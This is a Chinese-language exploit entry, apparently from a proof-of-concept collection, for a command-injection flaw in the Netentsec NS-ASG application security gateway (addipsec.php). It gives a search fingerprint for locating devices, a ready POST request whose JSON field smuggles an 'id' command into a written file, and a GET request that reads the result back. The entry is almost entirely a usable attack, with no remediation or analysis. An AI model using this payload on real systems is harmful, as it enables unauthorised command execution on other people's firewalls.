# 网康防火墙addipsec.php命令执行漏洞

- **系统**：网康防火墙addipsec.php　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="网康 NS-ASG 应用安全网关"`
- **请求**：`POST /protocol/index.php HTTP/1.1`

**请求体 / payload**
```
1.执行命令写入22.txt
Host:
Content-Length: 75
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
Ua-Cpu: AMD64
jsoncontent={"protocolType":"addipsec","messagecontent":"1\";id>22.txt;\""}
2.访问得到结果
GET /protocol/22.txt HTTP/1.1
Host:
Cookie: PHPSESSID=464ceeb55f746836bde663b9124e6cc3
Ua-Cpu: AMD64
```
- **预期**：200　|　—